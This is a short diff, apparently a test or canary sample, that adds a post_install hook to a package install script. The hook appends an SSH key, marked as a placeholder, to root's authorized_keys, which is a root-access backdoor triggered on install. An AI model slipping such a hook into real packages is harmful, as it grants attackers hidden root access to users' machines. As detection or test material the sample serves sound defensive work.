@@ -1,0 +1,4 @@
+post_install() {
+  mkdir -p /root/.ssh
+  echo 'ssh-ed25519 CANARY_not_a_real_key canary@example.invalid' >> /root/.ssh/authorized_keys
+}
